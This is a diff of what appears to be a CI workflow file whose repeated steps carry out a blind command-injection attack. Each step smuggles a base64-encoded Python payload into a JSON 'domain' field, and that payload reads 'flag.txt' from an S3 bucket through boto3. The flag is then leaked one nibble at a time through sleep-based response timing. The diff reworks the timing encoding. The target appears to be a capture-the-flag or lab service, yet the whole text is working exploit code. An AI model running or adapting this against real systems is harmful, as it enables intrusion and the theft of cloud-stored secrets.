+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -262,11 +237,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[8] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[9] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[8] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[9] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -274,11 +249,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[9] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[9] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[9] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[9] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -286,11 +261,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[9] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[10] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[9] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[10] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -298,11 +273,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[10] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[10] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[10] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[10] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -310,11 +285,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[10] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[11] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[10] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[11] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -322,11 +297,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[11] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[11] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[11] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[11] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTFdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -334,11 +309,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[11] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[12] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[11] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[12] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -346,11 +321,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[12] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[12] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[12] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[12] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTJdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -358,11 +333,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[12] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[13] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[12] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[13] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -370,11 +345,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[13] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[13] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[13] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[13] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTNdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -382,11 +357,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[13] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[14] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[13] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[14] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -394,11 +369,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[14] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[14] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[14] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[14] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTRdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -406,11 +381,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[14] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[15] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[14] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[15] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdPj40KSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -418,11 +393,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[15] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[15] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[15] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[15] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdJjB4ZikrMikKZXhjZXB0OgogICAgcGFzcw=="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTVdJjB4ZikqMisyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -430,4 +405,6 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[15] LO: ${MS}ms => nibble=$((MS/1000-2))"
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[15] lo: ${MS}ms => nibble=$NIBBLE"
+
